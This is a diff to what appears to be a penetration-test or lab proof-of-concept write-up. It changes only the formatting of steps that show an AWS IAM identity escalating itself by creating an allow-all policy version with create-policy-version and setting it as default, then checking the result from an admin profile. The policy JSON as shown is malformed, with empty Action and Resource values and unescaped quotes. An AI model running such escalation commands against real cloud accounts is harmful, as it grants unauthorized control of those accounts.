@@ -14,14 +14,11 @@ version as active — fully self-escalating with zero additional permissions.
 
 ## Attack steps
 
-1. Confirm current identity:
-
+**1. Confirm current identity:**
 aws sts get-caller-identity --profile qa-a
 
-2. Create a new malicious policy version, granting full access, and set as default:
-
+**2. Create a new malicious policy version, granting full access, and set as default:**
 aws iam create-policy-version --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/qa-testing-P --policy-document "{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"","Resource":""}]}" --set-as-default --profile qa-a
-
 
 **Result:**
 ```json
@@ -36,8 +33,7 @@ aws iam create-policy-version --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/qa-t
 
 ![QA-a self-escalation command output](../poc-ss/qa-a-attack-command1.png)
 
-3. Verified independently via admin account:
-
+**3. Verified independently via admin account:**
 aws iam get-policy --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/qa-testing-P --profile admin-k
 
 Confirmed `DefaultVersionId: "v2"` — the escalation is live account-wide.
